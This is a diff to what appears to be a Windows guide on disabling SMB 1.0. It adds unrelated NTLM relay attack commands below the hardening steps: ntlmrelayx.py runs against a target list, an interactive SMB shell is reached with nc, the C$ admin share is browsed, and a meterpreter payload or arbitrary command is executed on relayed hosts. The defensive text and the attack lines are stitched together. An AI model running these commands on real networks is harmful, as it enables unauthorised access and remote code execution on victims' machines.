@@ -77,5 +77,16 @@ In Control Panel, select Programs and Features.
 Under Control Panel Home, select Turn Windows features on or off to open the Windows Features box.
 In the Windows Features box, scroll down the list, clear the check box for SMB 1.0/CIFS File Sharing Support and select OK.
 
+ntlmrelayx.py -tf targets.txt -smb2support -i 
+Started interactive SMB client shell via TCP on 127.0.0.1:11001
 
+nc 127.0.0.1 11000
+
+SMB shell:
+help
+shares
+use C$
+
+ntlmrelayx.py -tf targets.txt -smb2support -e meterpreter.exe (msfvenom payload)
+ntlmrelayx.py -tf targets.txt -smb2support -c "command"
 
